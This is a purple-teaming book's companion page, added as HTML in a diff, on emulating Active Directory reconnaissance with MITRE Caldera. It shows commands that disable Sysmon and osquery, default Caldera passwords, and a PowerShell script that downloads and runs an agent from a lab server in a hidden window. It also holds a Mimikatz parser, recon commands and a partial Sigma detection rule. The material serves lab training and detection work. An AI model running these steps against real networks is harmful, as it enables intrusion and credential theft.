@@ -1,0 +1,649 @@
+<!doctype html>
+<html lang="en-US"><head>
+   <meta charset="utf-8">
+    <!-- Chulapa Jekyll Theme -  -->
+    <!--  MIT License-->
+    <!-- Docs: https://dieghernan.github.io/chulapa -->
+    <!-- Repo: https://github.com/dieghernan/chulapa -->
+    <!-- Page build 2025-02-24 20:58:58 +0000 -->
+     <!-- Jekyll Version 3.10.0 -->
+    <!--Google Structured Data-->
+    <script type="application/ld+json">
+        {
+      "@context": "https://schema.org",
+	  "@type": "Article",
+      "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "http://localhost:4000/part-II/ad-recon-with-mitre-caldera/"
+      },
+      "headline": "Active Directory Recon with MITRE Caldera",
+      "image": "https://github.com/ajpc500.png",
+      "datePublished": "2025-02-24T20:58:58+00:00",
+      "dateModified": "2025-02-24T20:58:58+00:00",
+      "author": {
+        "@type": "Person",
+        "name": "ajpc500"
+      },
+       "publisher": {
+        "@type": "Organization",
+        "name": "ajpc500",
+        "url": "http://localhost:4000/",
+        "logo": {
+          "@type": "ImageObject",
+          "url": "https://github.com/ajpc500.png"
+        }
+      }
+    }
+    </script>
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "BreadcrumbList",
+      "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "name": "Home",
+        "item": "http://localhost:4000/"
+      },{
+        "@type": "ListItem",
+        "position": 2,
+        "name": "Active Directory Recon with MITRE Caldera"
+      }]
+    }
+    </script>
+    <script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebPage",
+    "name": "Active Directory Recon with MITRE Caldera",
+    "description": ""
+    }
+}
+</script><script type="application/ld+json">
+{
+  "@context" : "https://schema.org",
+  "@type" : "Person",
+  "homeLocation": {
+    "@type": "Place",
+    "name": "London, United Kingdom"
+    },
+  "description": "Publisher",
+  "name" : "ajpc500",
+  "url" : "http://localhost:4000/"
+}
+</script>
+   <title>Active Directory Recon with MITRE Caldera | A Guide to Purple Teaming</title>
+  <link rel="canonical" href="http://localhost:4000/part-II/ad-recon-with-mitre-caldera/">
+    <!-- Atom feed -->
+  <link href="http://localhost:4000/atom.xml" type="application/atom+xml" rel="alternate" title="Atom feed A Guide to Purple Teaming" >
+    <!-- RSS 2.0 feed -->
+  <link href="http://localhost:4000/rss.xml" type="application/rss+xml" rel="alternate" title="RSS 2.0 feed A Guide to Purple Teaming" >
+    <!-- Meta tags -->
+   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+   <meta name="author" content="ajpc500" >
+   <meta name="copyright" content="ajpc500" >
+   <meta name="description" content="">
+   <meta name="thumbnail" content="https://github.com/ajpc500.png" >
+   <meta name="robots" content="index, follow"><meta name="keywords" content="">
+    <!-- Chrome, Firefox OS and Opera -->
+  <meta name="theme-color" content="#000000">
+    <!-- OpenGraph -->
+   <meta property="og:title" content="Active Directory Recon with MITRE Caldera | A Guide to Purple Teaming" >
+   <meta property="og:site_name" content="A Guide to Purple Teaming | A Guide to Purple Teaming" >
+   <meta property="og:url" content="http://localhost:4000/part-II/ad-recon-with-mitre-caldera/" >
+   <meta property="og:type" content="website" >
+   <meta property="og:description" content="" >
+   <meta property="og:locale" content="en-US" >
+   <meta property="og:image" content="https://github.com/ajpc500.png" >
+    <!-- Twitter/X Cards -->
+   <meta name="twitter:card" content="summary_large_image"><!-- start custom head snippets -->
+<!-- this script is inserted before the css stylesheet -->
+<!-- end custom head snippets -->
+<!-- CSS -->
+    <!-- Preconnect with Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <!-- Fontawesome-->
+    <!-- v6 -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css">
+  <link rel="preload" href="https://cdn.jsdelivr.net/gh/dieghernan/chulapa@master/assets/js/chulapa_script.js" as="script" >
+  <link rel="preload" href="https://cdn.jsdelivr.net/gh/dieghernan/chulapa@master/assets/fonts/Chulapa/Chulapa-Bold_vmod.otf" as="font" type="font/otf" crossorigin>
+    <!-- Theme css (Bootstrap included) -->
+  <link rel="stylesheet" id="maincss" href="http://localhost:4000/assets/css/main.css" >
+    <!-- Highlighter -->
+  <link id="csshigh" rel="stylesheet" href="http://localhost:4000/assets/css/highlighter.css" >
+    <!-- Custom css -->
+  <link rel="stylesheet" href="http://localhost:4000/assets/css/custom.css" >
+      <!-- start custom head snippets -->
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+<!-- end custom head snippets -->
+</head>
+<body class="d-flex flex-column h-entry" id="body">
+	<a class="u-url d-none" href="http://localhost:4000/part-II/ad-recon-with-mitre-caldera/">Invisible link to canonical for Microformats</a>
+	<div class="navbar-chulapa-fab">
+		<input type="checkbox" class="navbar-chulapa-fab-button d-none" id="navi-toggle">
+		<label for="navi-toggle" class="navbar-toggler p-1 m-0 text-center d-flex">
+			<span class="navbar-toggler-icon m-auto">&nbsp;</span>
+		</label>
+		<div class="navbar-chulapa-fab-background">&nbsp;</div>
+		<nav class="navbar-chulapa-fab-nav" aria-label="primary-navigation">
+			<ul class="navbar-nav text-center text-uppercase font-weight-light mt-0 mb-1 py-1">
+				<li class="nav-item">
+					<a class="nav-link px-3 navbar-brand mx-1 " href="http://localhost:4000/">Home</a>
+				</li><li class="nav-item dropdown my-0 py-1"><a class="nav-link dropdown-toggle px-3 py-1 " href="#" id="Part-I:-How-Purple-Teaming-Works" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Part I: How Purple Teaming Works</a>
+					<div class="dropdown-menu dropdown-menu-right text-center rounded-0 pr-4" aria-labelledby="Part-I:-How-Purple-Teaming-Works"><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-I/the-basics-of-purple-teaming">1. The Basics of Purple Teaming </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-I/offensive-and-defensive-frameworks">2. Offensive and Defensive Frameworks </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-I/the-atomic-methodology">3. The Atomic Methodology </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-I/the-scenario-based-methodology">4. The Scenario-based Methodology </a></div>
+				</li><li class="nav-item dropdown my-0 py-1"><a class="nav-link dropdown-toggle px-3 py-1 " href="#" id="Part-II:-Attack-Emulation-and-Detection-Lab" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Part II: Attack Emulation and Detection Lab</a>
+					<div class="dropdown-menu dropdown-menu-right text-center rounded-0 pr-4" aria-labelledby="Part-II:-Attack-Emulation-and-Detection-Lab"><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/environment-setup">5. Environment Setup </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/collecting-telemetry">6. Collecting Telemetry </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/network-traffic-and-event-tracing">7. Network Traffic and Event Tracing </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/lotl-with-atomic-red-team">8. Living-off-the-Land with Atomic Red Team </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/ad-recon-with-mitre-caldera">9. Active Directory Recon with MITRE Caldera </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/domain-compromise-with-mythic">10. Domain Compromise with Mythic </a></div>
+				</li><li class="nav-item dropdown my-0 py-1"><a class="nav-link dropdown-toggle px-3 py-1 " href="#" id="Part-III:-Organizing-an-Exercise" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Part III: Organizing an Exercise</a>
+					<div class="dropdown-menu dropdown-menu-right text-center rounded-0 pr-4" aria-labelledby="Part-III:-Organizing-an-Exercise"><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-III/reporting-and-tracking">11. Reporting and Tracking </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-III/implementing-a-purple-teaming-function">12. Implementing a Purple Teaming Function </a></div>
+				</li><li class="nav-item my-0 py-1">
+					<a class="nav-link px-3 py-1" href="http://localhost:4000/resources">Resources</a>
+				</li><li class="nav-item my-0 py-1">
+					<a class="nav-link px-3 py-1" href="http://localhost:4000/errata">Errata</a>
+				</li></ul>
+		</nav>
+	</div>	<header class="d-flex align-items-center hero-chulapa"><div class="container-lg py-4">
+   <h1 class="p-name">Active Directory Recon with MITRE Caldera</h1>
+ </div>
+</header>
+	<main class="container-lg pb-3 flex-fill">
+		<div class="row pt-2">
+			<aside class="col-lg-2 mt-lg-3 small"></aside>
+			<article id="maincontent" class="col-lg-8 mt-3 e-content">
+			<div class="bs-component">
+   <div class="progress">
+       <div class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" aria-valuemin="0" aria-valuemax="100" style="width: 75%; background-color:#eb34e1"></div>
+   </div>
+</div>
+<h2 id="introduction">Introduction</h2>
+<p>In the second of the emulation chapters in the book, we explore the steps an adversary might take to enumerate the configuration of the environment, and high-value Active Directory users and hosts. In this chapter we use the second of our offensive tools, MITRE Caldera.</p>
+<hr />
+<h2 id="chapter-content">Chapter Content</h2>
+<p>This section provides reproductions of the key figures and code snippets seen in this chapter.</p>
+<h4 id="the-caldera-emulation-framework">The Caldera Emulation Framework</h4>
+<h5 id="deploying-caldera">Deploying Caldera</h5>
+<p>These commands stop and disable Sysmon and osquery on the Linux host to prevent unwanted telemetry being logged to Splunk.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ubuntu@ar-linux:~<span class="nv">$ </span><span class="nb">sudo </span>systemctl stop sysmon
+ubuntu@ar-linux:~<span class="nv">$ </span><span class="nb">sudo </span>systemctl disable sysmon
+ubuntu@ar-linux:~<span class="nv">$ </span><span class="nb">sudo </span>systemctl stop osqueryd
+ubuntu@ar-linux:~<span class="nv">$ </span><span class="nb">sudo </span>systemctl disable osqueryd
+</code></pre></div></div>
+<p>Commands to clone the Caldera repository into <code class="language-plaintext highlighter-rouge">/opt</code>.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ubuntu@ar-linux:~<span class="nv">$ </span><span class="nb">cd</span> /opt
+ubuntu@ar-linux:/opt<span class="nv">$ </span><span class="nb">sudo </span>git clone https://github.com/aguidetopurpleteaming/caldera.git <span class="nt">--recursive</span>
+</code></pre></div></div>
+<p>Commands to install Docker and build the Caldera container.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ubuntu@ar-linux:/opt<span class="nv">$ </span><span class="nb">cd</span> /opt/caldera
+ubuntu@ar-linux:/opt/caldera<span class="nv">$ </span><span class="nb">sudo </span>apt update
+ubuntu@ar-linux:/opt/caldera<span class="nv">$ </span><span class="nb">sudo </span>apt <span class="nb">install</span> <span class="nt">-y</span> docker.io
+ubuntu@ar-linux:/opt/caldera<span class="nv">$ </span><span class="nb">sudo </span>docker build <span class="nt">--build-arg</span> <span class="nv">WIN_BUILD</span><span class="o">=</span><span class="nb">true</span> <span class="nb">.</span> <span class="nt">-t</span> caldera:server
+</code></pre></div></div>
+<p>Command to launch the Caldera container and ‘detach’ to leave it running as a background process.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ubuntu@ar-linux:/opt/caldera<span class="nv">$ </span><span class="nb">sudo </span>docker run <span class="nt">-d</span> <span class="nt">--name</span><span class="o">=</span>caldera <span class="nt">-p</span> 7010:7010 <span class="nt">-p</span> 7011:7011/udp <span class="nt">-p</span> 7012:7012 <span class="nt">-p</span> 8888:8888 caldera:server
+</code></pre></div></div>
+<p>Commands to spawn an interactive shell in the Caldera container and read the ‘red’ user default password.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ubuntu@ar-linux:/opt/caldera<span class="nv">$ </span><span class="nb">sudo </span>docker <span class="nb">exec</span> <span class="nt">-it</span> caldera /bin/bash
+root@e1a9473f9ca6:/usr/src/app# <span class="nb">cat </span>conf/local.yml
+
+<span class="nt">--snip--</span>
+<span class="nb">users</span>:
+  blue:
+    blue: z9yB8XthMOgaDiTChu7yXZ4sAdnJfJXwo9a_wo67hpY
+  red:
+    red: TxdlgzoC-0ZxnDTFYlUO_7UM3eEB1TecjYt3F43s2UY
+</code></pre></div></div>
+<h5 id="remotely-connecting-to-endpoints">Remotely Connecting to Endpoints</h5>
+<p>The PowerShell script used to connect hosts to the Caldera server by downloading and launching a Sandcat agent.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$server</span><span class="o">=</span><span class="s2">"http://10.0.1.21:8888"</span><span class="p">;</span><span class="w">
+</span><span class="nv">$url</span><span class="o">=</span><span class="s2">"</span><span class="nv">$server</span><span class="s2">/file/download"</span><span class="p">;</span><span class="w">
+</span><span class="nv">$wc</span><span class="o">=</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="p">;</span><span class="w">
+</span><span class="nv">$wc</span><span class="o">.</span><span class="nf">Headers</span><span class="o">.</span><span class="nf">add</span><span class="p">(</span><span class="s2">"platform"</span><span class="p">,</span><span class="s2">"windows"</span><span class="p">);</span><span class="w">
+</span><span class="nv">$wc</span><span class="o">.</span><span class="nf">Headers</span><span class="o">.</span><span class="nf">add</span><span class="p">(</span><span class="s2">"file"</span><span class="p">,</span><span class="s2">"sandcat.go"</span><span class="p">);</span><span class="w">
+</span><span class="nv">$data</span><span class="o">=</span><span class="nv">$wc</span><span class="o">.</span><span class="nf">DownloadData</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span><span class="w">
+</span><span class="n">get-process</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">modules</span><span class="o">.</span><span class="nf">filename</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"C:\Users\Public\agpt.exe"</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">stop-process</span><span class="w"> </span><span class="nt">-f</span><span class="p">;</span><span class="w">
+</span><span class="n">rm</span><span class="w"> </span><span class="nt">-force</span><span class="w"> </span><span class="s2">"C:\Users\Public\agpt.exe"</span><span class="w"> </span><span class="nt">-ea</span><span class="w"> </span><span class="nx">ignore</span><span class="p">;</span><span class="w">
+</span><span class="p">[</span><span class="n">io.file</span><span class="p">]::</span><span class="n">WriteAllBytes</span><span class="p">(</span><span class="s2">"C:\Users\Public\agpt.exe"</span><span class="p">,</span><span class="nv">$data</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="p">;</span><span class="w">
+</span><span class="n">Start-Process</span><span class="w"> </span><span class="nt">-FilePath</span><span class="w"> </span><span class="nx">C:\Users\Public\agpt.exe</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="s2">"-server </span><span class="nv">$server</span><span class="s2"> -group red"</span><span class="w"> </span><span class="nt">-WindowStyle</span><span class="w"> </span><span class="nx">hidden</span><span class="p">;</span><span class="w">
+</span></code></pre></div></div>
+<h5 id="selecting-abilities">Selecting Abilities</h5>
+<p>The YAML definition of the <i>Identify active user</i> ability:</p>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">---</span>
+
+<span class="pi">-</span> <span class="na">id</span><span class="pi">:</span> <span class="s">c0da588f-79f0-4263-8998-7496b1a40596</span>
+  <span class="na">name</span><span class="pi">:</span> <span class="s">Identify active user</span>
+  <span class="na">description</span><span class="pi">:</span> <span class="s">Find user running agent</span>
+  <span class="na">tactic</span><span class="pi">:</span> <span class="s">discovery</span>
+  <span class="na">technique</span><span class="pi">:</span>
+    <span class="na">attack_id</span><span class="pi">:</span> <span class="s">T1033</span>
+    <span class="na">name</span><span class="pi">:</span> <span class="s">System Owner/User Discovery</span>
+  <span class="na">platforms</span><span class="pi">:</span>
+    <span class="na">darwin</span><span class="pi">:</span>
+      <span class="na">sh</span><span class="pi">:</span>
+        <span class="na">command</span><span class="pi">:</span> <span class="s">whoami</span>
+        <span class="na">parsers</span><span class="pi">:</span>
+          <span class="na">plugins.stockpile.app.parsers.basic</span><span class="pi">:</span>
+            <span class="pi">-</span> <span class="na">source</span><span class="pi">:</span> <span class="s">host.user.name</span>
+            <span class="pi">-</span> <span class="na">source</span><span class="pi">:</span> <span class="s">domain.user.name</span>
+    <span class="na">linux</span><span class="pi">:</span>
+      <span class="na">sh</span><span class="pi">:</span>
+        <span class="na">command</span><span class="pi">:</span> <span class="s">whoami</span>
+        <span class="na">parsers</span><span class="pi">:</span>
+          <span class="na">plugins.stockpile.app.parsers.basic</span><span class="pi">:</span>
+            <span class="pi">-</span> <span class="na">source</span><span class="pi">:</span> <span class="s">host.user.name</span>
+            <span class="pi">-</span> <span class="na">source</span><span class="pi">:</span> <span class="s">domain.user.name</span>
+    <span class="na">windows</span><span class="pi">:</span>
+      <span class="na">psh</span><span class="pi">:</span>
+        <span class="na">command</span><span class="pi">:</span> <span class="pi">|</span>
+          <span class="s">$env:username</span>
+        <span class="na">parsers</span><span class="pi">:</span>
+          <span class="na">plugins.stockpile.app.parsers.basic</span><span class="pi">:</span>
+            <span class="pi">-</span> <span class="na">source</span><span class="pi">:</span> <span class="s">host.user.name</span>
+            <span class="pi">-</span> <span class="na">source</span><span class="pi">:</span> <span class="s">domain.user.name</span>
+      <span class="na">cmd</span><span class="pi">:</span>
+        <span class="na">command</span><span class="pi">:</span> <span class="s">echo %username%</span>
+        <span class="na">parsers</span><span class="pi">:</span>
+          <span class="na">plugins.stockpile.app.parsers.basic</span><span class="pi">:</span>
+            <span class="pi">-</span> <span class="na">source</span><span class="pi">:</span> <span class="s">host.user.name</span>
+            <span class="pi">-</span> <span class="na">source</span><span class="pi">:</span> <span class="s">domain.user.name</span>
+</code></pre></div></div>
+<h5 id="working-with-facts">Working with Facts</h5>
+<p>A YAML definition for the ability to identify processes run by the users of a Linux host.</p>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">---</span>
+
+<span class="pi">-</span> <span class="na">id</span><span class="pi">:</span> <span class="s">3b5db901-2cb8-4df7-8043-c4628a6a5d5a</span>
+  <span class="na">name</span><span class="pi">:</span> <span class="s">Find user processes</span>
+  <span class="na">description</span><span class="pi">:</span> <span class="s">Get process info for processes running as a user</span>
+  <span class="na">tactic</span><span class="pi">:</span> <span class="s">discovery</span>
+  <span class="na">technique</span><span class="pi">:</span>
+    <span class="na">attack_id</span><span class="pi">:</span> <span class="s">T1057</span>
+    <span class="na">name</span><span class="pi">:</span> <span class="s">Process Discovery</span>
+  <span class="na">platforms</span><span class="pi">:</span>
+    <span class="na">linux</span><span class="pi">:</span>
+      <span class="na">sh</span><span class="pi">:</span>
+        <span class="na">command</span><span class="pi">:</span> <span class="pi">|</span>
+          <span class="s">ps aux | grep #{host.user.name}</span>
+    <span class="s">--snip--</span>
+  <span class="na">requirements</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="na">plugins.stockpile.app.requirements.paw_provenance</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="na">source</span><span class="pi">:</span> <span class="s">host.user.name</span>
+</code></pre></div></div>
+<p>A snippet of the parser definitions for extracting users, passwords and NTHashes for users from Mimikatz output.</p>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">parsers</span><span class="pi">:</span>
+  <span class="na">plugins.stockpile.app.parsers.katz</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">source</span><span class="pi">:</span> <span class="s">domain.user.name</span>
+    <span class="na">edge</span><span class="pi">:</span> <span class="s">has_password</span>
+    <span class="na">target</span><span class="pi">:</span> <span class="s">domain.user.password</span>
+  <span class="pi">-</span> <span class="na">source</span><span class="pi">:</span> <span class="s">domain.user.name</span>
+    <span class="na">edge</span><span class="pi">:</span> <span class="s">has_hash</span>
+    <span class="na">target</span><span class="pi">:</span> <span class="s">domain.user.ntlm</span>
+  <span class="pi">-</span> <span class="na">source</span><span class="pi">:</span> <span class="s">domain.user.name</span>
+    <span class="na">edge</span><span class="pi">:</span> <span class="s">has_hash</span>
+    <span class="na">target</span><span class="pi">:</span> <span class="s">domain.user.sha1</span>
+</code></pre></div></div>
+<p>An <i>Impersonate User</i> ability that leverages the <code class="language-plaintext highlighter-rouge">paw_provenance</code> plugin to match user credential facts to the current host.</p>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">---</span>
+
+<span class="pi">-</span> <span class="na">id</span><span class="pi">:</span> <span class="s">3796a00b-b11d-4731-b4ca-275a07d83299</span>
+  <span class="na">name</span><span class="pi">:</span> <span class="s">Impersonate user</span>
+  <span class="na">description</span><span class="pi">:</span> <span class="s">Run an application as a different user</span>
+  <span class="na">tactic</span><span class="pi">:</span> <span class="s">execution</span>
+  <span class="na">technique</span><span class="pi">:</span>
+    <span class="na">attack_id</span><span class="pi">:</span> <span class="s">T1059.001</span>
+    <span class="na">name</span><span class="pi">:</span> <span class="s2">"</span><span class="s">Command</span><span class="nv"> </span><span class="s">and</span><span class="nv"> </span><span class="s">Scripting</span><span class="nv"> </span><span class="s">Interpreter:</span><span class="nv"> </span><span class="s">PowerShell"</span>
+  <span class="na">platforms</span><span class="pi">:</span>
+    <span class="na">windows</span><span class="pi">:</span>
+      <span class="na">psh</span><span class="pi">:</span>
+        <span class="na">command</span><span class="pi">:</span> <span class="pi">|</span>
+          <span class="s">$job = Start-Job -ScriptBlock {</span>
+            <span class="s">$username = '#{host.user.name}';</span>
+            <span class="s">$password = '#{host.user.password}';</span>
+            <span class="s">$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;</span>
+            <span class="s">$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;</span>
+            <span class="s">Start-Process Notepad.exe -NoNewWindow -PassThru -Credential $credential;</span>
+          <span class="s">};</span>
+          <span class="s">Receive-Job -Job $job -Wait;</span>
+  <span class="na">requirements</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="na">plugins.stockpile.app.requirements.paw_provenance</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="na">source</span><span class="pi">:</span> <span class="s">host.user.name</span>
+    <span class="pi">-</span> <span class="na">plugins.stockpile.app.requirements.basic</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="na">source</span><span class="pi">:</span> <span class="s">host.user.name</span>
+        <span class="na">edge</span><span class="pi">:</span> <span class="s">has_password</span>
+        <span class="na">target</span><span class="pi">:</span> <span class="s">host.user.password</span>
+</code></pre></div></div>
+<h4 id="logging">Logging</h4>
+<div class="bs-component">
+   <div class="alert alert-warning">
+        You can download <code>calderaToAttire</code> from: <a target="_blank" href="https://github.com/improsec/calderaToAttire">https://github.com/improsec/calderaToAttire</a>
+   </div>
+</div>
+<p>Command to convert an exported Caldera report output to ATTiRe format using <code class="language-plaintext highlighter-rouge">calderaToAttire</code>.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ubuntu@agpt:/Tools/calderaToAttire<span class="nv">$ </span>python CalderaToAttire.py Enumerator_report.json
+</code></pre></div></div>
+<h4 id="simulating-active-directory-enumeration">Simulating Active Directory Enumeration</h4>
+<p>Commands used in the creation of abilities for Active Directory reconnaissance.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nltest /domain_trusts /all_trusts
+nltest /dclist:%USERDOMAIN%
+net group <span class="s2">"Domain Admins"</span> /domain
+</code></pre></div></div>
+<p>Additional commands leveraging PowerShell and the PowerView script.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w"> </span><span class="nt">-Force</span><span class="p">;</span><span class="w"> 
+</span><span class="n">Get-DomainComputer</span><span class="w"> </span><span class="nt">-OperatingSystem</span><span class="w"> </span><span class="o">*</span><span class="nx">server</span><span class="o">*</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">dnshostname</span><span class="w">
+
+</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w"> </span><span class="nt">-Force</span><span class="p">;</span><span class="w"> 
+</span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nt">-SPN</span><span class="w"> 
+</span></code></pre></div></div>
+<h4 id="defending-against-the-attack">Defending Against the Attack</h4>
+<h5 id="command-line-arguments">Command Line Arguments</h5>
+<p>A sigma rule for detection of <code class="language-plaintext highlighter-rouge">nltest</code> usage.</p>
+<table>
+ <tbody>
+   <tr>
+     <td>Sourced from: <a target="_blank" href="https://github.com/SigmaHQ/sigma/blob/fad4742996c55d8d4663e611f84877a2b741dc46/rules/windows/process_creation/proc_creation_win_net_groups_and_accounts_recon.yml">https://github.com/SigmaHQ/sigma/blob/fad4742996c55d8d4663e611f84877a2b741dc46/rules/windows/process_creation/proc_creation_win_net_groups_and_accounts_recon.yml</a></td>
+   </tr>
+ </tbody>
+</table>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">title</span><span class="pi">:</span> <span class="s">Potential Recon Activity Via Nltest.EXE</span>
+<span class="na">id</span><span class="pi">:</span> <span class="s">5cc90652-4cbd-4241-aa3b-4b462fa5a248</span>
+<span class="na">related</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="na">id</span><span class="pi">:</span> <span class="s">410ad193-a728-4107-bc79-4419789fcbf8</span>
+      <span class="na">type</span><span class="pi">:</span> <span class="s">similar</span>
+    <span class="pi">-</span> <span class="na">id</span><span class="pi">:</span> <span class="s">903076ff-f442-475a-b667-4f246bcc203b</span>
+      <span class="na">type</span><span class="pi">:</span> <span class="s">similar</span>
+    <span class="pi">-</span> <span class="na">id</span><span class="pi">:</span> <span class="s">77815820-246c-47b8-9741-e0def3f57308</span>
+      <span class="na">type</span><span class="pi">:</span> <span class="s">obsolete</span>
+<span class="na">status</span><span class="pi">:</span> <span class="s">test</span>
+<span class="na">description</span><span class="pi">:</span> <span class="s">Detects nltest commands that can be used for information discovery</span>
+<span class="na">references</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="s">https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731935(v=ws.11)</span>
+    <span class="pi">-</span> <span class="s">https://thedfirreport.com/2021/08/16/trickbot-leads-up-to-fake-1password-installation/</span>
+    <span class="pi">-</span> <span class="s">https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/</span>
+    <span class="pi">-</span> <span class="s">https://book.hacktricks.xyz/windows/basic-cmd-for-pentesters</span>
+    <span class="pi">-</span> <span class="s">https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/</span>
+    <span class="pi">-</span> <span class="s">https://eqllib.readthedocs.io/en/latest/analytics/03e231a6-74bc-467a-acb1-e5676b0fb55e.html</span>
+    <span class="pi">-</span> <span class="s">https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/</span>
+    <span class="pi">-</span> <span class="s">https://github.com/redcanaryco/atomic-red-team/blob/5360c9d9ffa3b25f6495f7a16e267b719eba2c37/atomics/T1482/T1482.md#atomic-test-2---windows---discover-domain-trusts-with-nltest</span>
+<span class="na">author</span><span class="pi">:</span> <span class="s">Craig Young, oscd.community, Georg Lauenstein</span>
+<span class="na">date</span><span class="pi">:</span> <span class="s">2021-07-24</span>
+<span class="na">modified</span><span class="pi">:</span> <span class="s">2023-12-15</span>
+<span class="na">tags</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="s">attack.discovery</span>
+    <span class="pi">-</span> <span class="s">attack.t1016</span>
+    <span class="pi">-</span> <span class="s">attack.t1482</span>
+<span class="na">logsource</span><span class="pi">:</span>
+    <span class="na">category</span><span class="pi">:</span> <span class="s">process_creation</span>
+    <span class="na">product</span><span class="pi">:</span> <span class="s">windows</span>
+<span class="na">detection</span><span class="pi">:</span>
+    <span class="na">selection_nltest</span><span class="pi">:</span>
+        <span class="pi">-</span> <span class="na">Image|endswith</span><span class="pi">:</span> <span class="s1">'</span><span class="s">\nltest.exe'</span>
+        <span class="pi">-</span> <span class="na">OriginalFileName</span><span class="pi">:</span> <span class="s1">'</span><span class="s">nltestrk.exe'</span>
+    <span class="na">selection_recon</span><span class="pi">:</span>
+        <span class="pi">-</span> <span class="na">CommandLine|contains|all</span><span class="pi">:</span>
+              <span class="pi">-</span> <span class="s1">'</span><span class="s">server'</span>
+              <span class="pi">-</span> <span class="s1">'</span><span class="s">query'</span>
+        <span class="pi">-</span> <span class="na">CommandLine|contains</span><span class="pi">:</span>
+              <span class="pi">-</span> <span class="s1">'</span><span class="s">/user'</span>
+              <span class="pi">-</span> <span class="s1">'</span><span class="s">all_trusts'</span> <span class="c1"># Flag for /domain_trusts</span>
+              <span class="pi">-</span> <span class="s1">'</span><span class="s">dclist:'</span>
+              <span class="pi">-</span> <span class="s1">'</span><span class="s">dnsgetdc:'</span>
+              <span class="pi">-</span> <span class="s1">'</span><span class="s">domain_trusts'</span>
+              <span class="pi">-</span> <span class="s1">'</span><span class="s">dsgetdc:'</span>
+              <span class="pi">-</span> <span class="s1">'</span><span class="s">parentdomain'</span>
+              <span class="pi">-</span> <span class="s1">'</span><span class="s">trusted_domains'</span>
+    <span class="na">condition</span><span class="pi">:</span> <span class="s">all of selection_*</span>
+<span class="na">falsepositives</span><span class="pi">:</span>
